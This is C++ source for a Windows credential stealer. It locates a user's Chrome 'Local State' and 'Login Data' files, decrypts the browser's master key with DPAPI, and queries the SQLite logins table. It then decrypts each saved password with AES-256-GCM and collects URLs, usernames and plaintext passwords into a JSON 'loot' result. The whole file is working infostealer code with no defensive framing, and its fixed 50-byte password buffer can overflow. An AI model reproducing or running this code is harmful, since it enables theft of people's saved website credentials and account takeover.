#include <string>
#include <iostream>
#include <sstream>
#include <windows.h>
#include <dpapi.h>

#include "loot.hpp"
#include "../file_io/file_io.h"
#include "../libs/base64/base64.h"
#include "../libs/sqlite3/sqlite3.h"
#include "../libs/sodium/sodium.h"

using namespace std;

string getEncryptedKey(string userName);
string getLoginDataPath(string userName);
void decryptPassword(const unsigned char* masterKey,
	unsigned char* password_value, int passwordLen, unsigned char* decrypted);
void initializeSodiumLibrary();
json getRowData(sqlite3_stmt* statement, const unsigned char* masterKey);

HMODULE hSqlModule = LoadLibrary(TEXT("../libs/sqlite3/sqlite3.dll"));
HMODULE hSodiumModule = LoadLibrary(TEXT("../libs/sodium/libsodium-23.dll"));

// Master key used for decrypting user passwords stored in Login Data sql file
void getMasterKey(unsigned char* masterKey, string userName) {
	string encryptedKey = getEncryptedKey(userName);

	vector<BYTE> base64Decrypted = base64_decode(encryptedKey);

	DWORD cbData = base64Decrypted.size() - 5;
	BYTE* dpapiEncrypted = new BYTE[cbData];
	copy(base64Decrypted.begin() + 5, base64Decrypted.end(), dpapiEncrypted);

	DATA_BLOB dataIn;
	DATA_BLOB dataOut;

	dataIn.pbData = dpapiEncrypted;
	dataIn.cbData = cbData;

	// DPAPI decrypt
	bool decryptSuccess =
		CryptUnprotectData(&dataIn, nullptr, nullptr, nullptr, nullptr, 0, &dataOut);

	delete[] dpapiEncrypted;

	if (!decryptSuccess) {
		cout << "Failed to decrypt" << endl;
		return;
	}

	memcpy(masterKey, dataOut.pbData, dataOut.cbData);
	LocalFree(dataOut.pbData);
}

void printUCharAsHex(unsigned char* uChar, int len) {
	// Source: https://stackoverflow.com/questions/10451493/how-to-print-unsigned-char-as-hex-in-c
	// eigenfield's answer

	for (int i = 0; i < len; i++) {
    std::cout << std::setfill('0')
      << std::setw(2)
      << std::uppercase
      << std::hex << (0xFF & uChar[i]) << " ";
	}
}

json lootChromePasswords(const unsigned char* masterKey, string userName) {

	json lootResult = json::array();

	typedef int (*sqlite3_open_t) (const char *filename, sqlite3 **ppDb);
	typedef const char* (*sqlite3_errmsg_t) (sqlite3*);
	typedef int (*sqlite3_close_t) (sqlite3*);
	typedef int (*sqlite3_prepare_v2_t) ( sqlite3 *db, const char *zSql, int nByte,
		sqlite3_stmt **ppStmt, const char **pzTail);
	typedef int (*sqlite3_bind_text_t) (sqlite3_stmt*,int,const char*,int,void(*)(void*));
	typedef int (*sqlite3_finalize_t) (sqlite3_stmt *pStmt);
	typedef int (*sqlite3_step_t) (sqlite3_stmt*);
	typedef const unsigned char* (*sqlite3_column_text_t) (sqlite3_stmt*, int iCol);
	typedef int (*sqlite3_column_bytes_t) (sqlite3_stmt*, int iCol);

	sqlite3_open_t sqlite3_open = (sqlite3_open_t) GetProcAddress(hSqlModule, "sqlite3_open");
	sqlite3_errmsg_t sqlite3_errmsg = (sqlite3_errmsg_t) GetProcAddress(hSqlModule, "sqlite3_errmsg");
	sqlite3_close_t sqlite3_close = (sqlite3_close_t) GetProcAddress(hSqlModule, "sqlite3_close");
	sqlite3_prepare_v2_t sqlite3_prepare_v2 = (sqlite3_prepare_v2_t) GetProcAddress(hSqlModule, "sqlite3_prepare_v2");
	sqlite3_bind_text_t sqlite3_bind_text = (sqlite3_bind_text_t) GetProcAddress(hSqlModule, "sqlite3_bind_text");
	sqlite3_finalize_t sqlite3_finalize = (sqlite3_finalize_t) GetProcAddress(hSqlModule, "sqlite3_finalize");
	sqlite3_step_t sqlite3_step = (sqlite3_step_t) GetProcAddress(hSqlModule, "sqlite3_step");
	sqlite3_column_text_t sqlite3_column_text = (sqlite3_column_text_t) GetProcAddress(hSqlModule, "sqlite3_column_text");
	sqlite3_column_bytes_t sqlite3_column_bytes = (sqlite3_column_bytes_t) GetProcAddress(hSqlModule, "sqlite3_column_bytes");

	sqlite3 *db = nullptr;
	char *zErrMsg = 0;
	int errorCode = 0;

	// Get dbFile path
	string loginDataPath = getLoginDataPath(userName);
	int pathLen = loginDataPath.length();
	char dbFile[pathLen + 1];
	strncpy(dbFile, loginDataPath.c_str(), pathLen);
	dbFile[pathLen] = '\0';

	// Open database
	errorCode = sqlite3_open(dbFile, &db);

	if (errorCode) {
		fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
		json error = "Error";
		return error;
	} else {
		fprintf(stderr, "Opened database successfully\n");
	}

	// Create SQL statement
	// Source: https://stackoverflow.com/questions/27383724/sqlite3-prepare-v2-sqlite3-exec
	// Rob's answer
	sqlite3_stmt* statement;
	const char* statementStr = "SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created";
	if (sqlite3_prepare_v2(db, statementStr, -1, &statement, NULL) != SQLITE_OK) {
    cout << "Prepare failure: %s\n" << sqlite3_errmsg(db) << endl;
		json error = "Error";
		return error;
	}

	// Get results of statement
	int stepResult;

	while ((stepResult = sqlite3_step(statement)) == SQLITE_ROW) {
		json rowData = getRowData(statement, masterKey);
		lootResult.push_back(rowData);
	}

	if (stepResult != SQLITE_DONE) {
    cout << "Step failure: %s\n" << sqlite3_errmsg(db) << endl;
	}

	sqlite3_finalize(statement);
  sqlite3_close(db);

	return lootResult;
}

// Get the encrypted key stored at Local State file
// Need to decrypt it with Base64 and then DPAPI to get the master key for decrypting user passwords
string getEncryptedKey(string userName) {
  std::ostringstream stream;
  stream << "C:\\Users\\" << userName << "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";

	int len = stream.str().length();
	char filePath[len + 1];
  strncpy(filePath, stream.str().c_str(), len);
	filePath[len] = '\0';

	FileIO fileIO = FileIO();
	fileIO.ReadFileContent(filePath);
	char* fileContent = fileIO.fileContentBuf;

	string fileContentAsString(fileContent);

	json fileJson = json::parse(fileContentAsString);
	string encryptedKey = fileJson["os_crypt"]["encrypted_key"];

	return encryptedKey;
}

// Stores website login info (url, username, password)
string getLoginDataPath(string userName) {
	std::ostringstream stream;
  stream << "C:\\Users\\"
		<< userName
		<< "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\0";

	string path = stream.str();
	return path;
}

// Login Data contains encrypted passwords, need to decrypt using master key
void decryptPassword(const unsigned char* masterKey,
	unsigned char* password_value, int passwordLen, unsigned char* decrypted) {

	// Initialize sodium library to use crypto_aead_aes256gcm_decrypt
	initializeSodiumLibrary();

	// Define crypto_aead_aes256gcm_decrypt
	typedef int (*crypto_aead_aes256gcm_decrypt_t) (unsigned char *m,
	  unsigned long long *mlen_p, unsigned char *nsec,
	  const unsigned char *c, unsigned long long clen,
	  const unsigned char *ad, unsigned long long adlen,
	  const unsigned char *npub, const unsigned char *k);

	// Get address of crypto_aead_aes256gcm_decrypt from sodium dll
	crypto_aead_aes256gcm_decrypt_t crypto_aead_aes256gcm_decrypt
		= (crypto_aead_aes256gcm_decrypt_t)
			GetProcAddress(hSodiumModule, "crypto_aead_aes256gcm_decrypt");

	// Prepare parameters for decryption function
	unsigned long long decryptedLen = 0;

	int ivLen = 12;
	BYTE iv[ivLen];
	memcpy(iv, &password_value[3], ivLen);

	int ciphertextLen = ((int) passwordLen) - 15;
	BYTE ciphertext[ciphertextLen];
	memset(ciphertext, 0, ciphertextLen);
	memcpy(ciphertext, &password_value[15], ciphertextLen);

	// Reference: https://libsodium.gitbook.io/doc/secret-key_cryptography/aead/aes-256-gcm#example-combined-mode
	// Decrypt to get user's password
	bool decryptFailed = crypto_aead_aes256gcm_decrypt(
		decrypted,
		&decryptedLen,
		NULL,
		(const unsigned char*) ciphertext,
		(unsigned long long) ciphertextLen,
		NULL,
		0,
		(const unsigned char*) iv,
		(const unsigned char*) masterKey
	);

	if (decryptFailed) {
		cout << "crypto_aead_aes256gcm_decrypt failed" << endl;
		abort();
	}

	decrypted[decryptedLen] = '\0';
}

void initializeSodiumLibrary() {
	typedef int (*sodium_init_t) (void);
	typedef int (*crypto_aead_aes256gcm_is_available_t) (void);

	sodium_init_t sodium_init
		= (sodium_init_t) GetProcAddress(hSodiumModule, "sodium_init");
	crypto_aead_aes256gcm_is_available_t crypto_aead_aes256gcm_is_available
		= (crypto_aead_aes256gcm_is_available_t)
			GetProcAddress(hSodiumModule, "crypto_aead_aes256gcm_is_available");

	// Initialize sodium library, used for crypto_aead_aes256gcm_decrypt
	if (sodium_init() < 0) {
		cout << "Unable to initialize sodium, will be unable to use crypto_aead_aes256gcm_decrypt." << endl;
  }

	if (crypto_aead_aes256gcm_is_available() == 0) {
		cout << "Unable to use crypto_aead_aes256gcm on this CPU." << endl;
    abort(); /* Not available on this CPU */
	}
}

json getRowData(sqlite3_stmt* statement, const unsigned char* masterKey) {
	// Define sqlite3 functions
	typedef const unsigned char* (*sqlite3_column_text_t) (sqlite3_stmt*, int iCol);
	typedef int (*sqlite3_column_bytes_t) (sqlite3_stmt*, int iCol);

	// Get addresses sqlite3 functions from sqlite3 dll
	sqlite3_column_text_t sqlite3_column_text = (sqlite3_column_text_t) GetProcAddress(hSqlModule, "sqlite3_column_text");
	sqlite3_column_bytes_t sqlite3_column_bytes = (sqlite3_column_bytes_t) GetProcAddress(hSqlModule, "sqlite3_column_bytes");

	unsigned char* original_url = (unsigned char*) sqlite3_column_text(statement, 0);
	unsigned char* username_value = (unsigned char*) sqlite3_column_text(statement, 1);
	unsigned char* password_value = (unsigned char*) sqlite3_column_text(statement, 2);
	int passwordLen = sqlite3_column_bytes(statement, 2);

	unsigned char decryptedPassword[50];
	decryptPassword(masterKey, password_value, passwordLen, decryptedPassword);

	string originalUrl(reinterpret_cast<char*>(original_url));
	string usernameValue(reinterpret_cast<char*>(username_value));
	string passwordValue(reinterpret_cast<char*>(decryptedPassword));

	json rowData = {
		{"original_url", originalUrl},
		{"username_value", usernameValue},
		{"password_value", passwordValue}
	};

	return rowData;
}
